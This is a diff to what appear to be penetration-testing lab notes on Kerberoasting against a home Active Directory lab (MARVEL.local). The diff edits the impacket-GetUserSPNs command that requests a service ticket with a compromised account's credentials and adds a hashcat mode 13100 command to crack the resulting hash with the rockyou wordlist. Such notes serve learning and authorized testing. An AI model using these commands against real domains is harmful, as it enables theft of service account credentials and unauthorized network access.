@@ -105,13 +105,17 @@ When running hashcat, ensure the correct mode -m is selected for the hash type. 
 Goal of Kerberoasting: With an **account on the network**, get ticket Granting Service Ticket (TGS) from the KDC and decrypt server's account hash that is presented back (step 4 of diagram).
 ![image](https://github.com/user-attachments/assets/1109a3ee-1433-44e6-9caf-a04e757129fb)  
 
-Using impacket-GetUserSPNs | impacket-GetUsersSPNs DOMAIN/username:password -dc-ip 192.168.64.138 -request
+Using impacket-GetUserSPNs we now direct our compromised account towawrds the Service Principle Name (our DC) for a TGS | impacket-GetUsersSPNs DOMAIN/username:password -dc-ip 192.168.64.138 -request
 
-    impacket-GetUsersSPNs MARVEL-local/fcastle:Password1 -dc-ip 192.168.64.138 -request
+    impacket-GetUsersSPNs MARVEL.local/fcastle:Password1 -dc-ip 192.168.64.138 -request
 
 ![image](https://github.com/user-attachments/assets/e4d79c04-c03d-46af-bcab-3437bfc0b4f0)
 
-Now that we have the hash obtained from the TGS, we can now proceed to crack it.
+Now that we have obtained a hash from the TGS, we can now proceed to crack it.
+
+    root@kali:/home/kali/tempdeletelater# hashcat -m 13100 krbhash.txt /usr/share/wordlists/rockyou.txt
+
+
 
 
 
